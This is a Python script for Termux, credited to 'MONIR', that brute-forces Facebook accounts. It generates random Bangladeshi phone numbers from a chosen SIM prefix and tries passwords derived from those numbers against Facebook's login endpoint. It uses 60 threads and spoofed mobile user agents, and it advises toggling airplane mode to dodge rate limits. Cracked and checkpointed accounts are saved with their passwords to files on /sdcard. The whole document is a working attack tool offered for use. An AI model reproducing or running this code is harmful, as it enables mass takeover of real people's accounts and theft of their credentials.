#SCRIPT WRITE BY MONIR KING
#GITHUB : 
#FACEBOOK:("xdg-open https://www.facebook.com/mdmonirhossen62")
#ALWAYS REMEMBER
#───────────────[ MONIR ]───────────────#
import os,time,sys
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
logo = """ 

 __       __                      __           
|  \     /  \                    |  \          
| $$\   /  $$  ______   _______   \$$  ______  
| $$$\ /  $$$ /      \ |       \ |  \ /      \ 
| $$$$\  $$$$|  $$$$$$\| $$$$$$$\| $$|  $$$$$$\
| $$\$$ $$ $$| $$  | $$| $$  | $$| $$| $$   \$$
| $$ \$$$| $$| $$__/ $$| $$  | $$| $$| $$      
| $$  \$ | $$ \$$    $$| $$  | $$| $$| $$      
 \$$      \$$  \$$$$$$  \$$   \$$ \$$ \$$      
                                               
                                               
                                               

\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   : MONIR 𖤍
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  Md Monir Hossen 
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m VERSION     :  1.1
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m TOOL        :  \033[1;34mRANDOM\033[1;32m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FB GROUP    :  \033[1;91m\033[1;41m\033[1;33mTERMUX FREE COMMANDS BY MONIR\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
ok = []
cp = []
id = []
session = requests.Session()
user = []
loop = 0
oks = []
cps = []
loop = 0
ugen=[]
for ua in range(1000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['12' , '13' , '14' , '15'])
      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,100)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
def Main():
	os.system('clear')
	print(logo)
	print("\033[1;32mBD SIM CODE :  017 018 019 013 015 016 ")
	print(50*'━')
	love = input('[?] SELECT : ')
	print(50*'━')
	print('EXAMPLE :  1000,5000,10000,15000,20000 ')
	print(50*'━')
	limit = int(input('[?] LIMIT : '))
	for nmbr in range(limit):
		lova = ''.join(random.choice(string.digits) for _ in range(2))
		lovb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with tred(max_workers=60) as GIFT:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print(' \033[1;31m[\033[1;37m+\033[1;31m]SIM CODE   : '+love)
		print(' \033[1;31m[\033[1;37m+\033[1;31m]TOTAL UID   :  '+tl)
		print(' \033[1;31m[\033[1;37m+\033[1;31m]\033[1;92m TURN \033[1;37m[\033[1;92mON\033[1;31m/\033[1;92mOFF\033[1;37m]\033[1;92m AIRPLANE MODE EVERY 5 MIN')
		print(50*'━')
		for guru in user:
			uid = love+lova+lovb+guru
			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
			GIFT.submit(test,uid,pwx,tl)
	print(50*'━')
	print(' THANK YOU FOR USING MONIR TOOL')
	print(' SEE YOU NXT TIME WITH ANOTHER UPDATE ')
	print(50*'━')
	exit()
#––———–—–—–TOOL_UPDATE-SYSTEM––———–—–—–#
def test(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;35m[\033[1;92mGIFT\033[1;35m] \033[1;96m[\033[1;96m%s/%s]\033[1;90m \033[1;31m[\033[1;92mOK:%s\033[1;31m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"CPH1923"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"9.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m[GIFT-OK] '+cid+' • '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/Ghost-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[GIFT-CP] {uid} • {ps}")
                open('/sdcard/Gift-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1        
    except:
        pass
Main()